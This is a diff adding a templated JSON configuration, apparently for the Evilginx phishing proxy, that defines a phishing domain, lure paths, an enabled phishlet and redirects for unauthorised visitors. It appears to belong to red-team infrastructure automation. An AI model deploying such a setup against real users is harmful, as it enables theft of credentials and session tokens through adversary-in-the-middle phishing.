@@ -1,0 +1,39 @@
+{
+  "blacklist": {
+    "mode": "unauth"
+  },
+  "general": {
+    "bind_ipv4": "",
+    "dns_port": 53,
+    "domain": "{{ domain_phish }}",
+    "external_ipv4": "{{ ip_redir_phish }}",
+    "https_port": 443,
+    "ipv4": "",
+    "unauth_url": "{{ redirect_url }}"
+  },
+  "lures": [
+    {
+      "id": "",
+      "hostname": "{{ domain_phish }}",
+      "path": "{{ path_lures }}",
+      "redirect_url": "{{ redirect_url }}",
+      "phishlet": "{{ phishlets_name }}",
+      "redirector": "",
+      "ua_filter": "",
+      "info": "",
+      "og_title": "",
+      "og_desc": "",
+      "og_image": "",
+      "og_url": "",
+      "paused": 0
+    }
+  ],
+  "phishlets": {
+    "{{ phishlets_name }}": {
+      "hostname": "{{ domain_phish }}",
+      "unauth_url": "{{ redirect_url }}",
+      "enabled": true,
+      "visible": true
+    }
+  }
+}
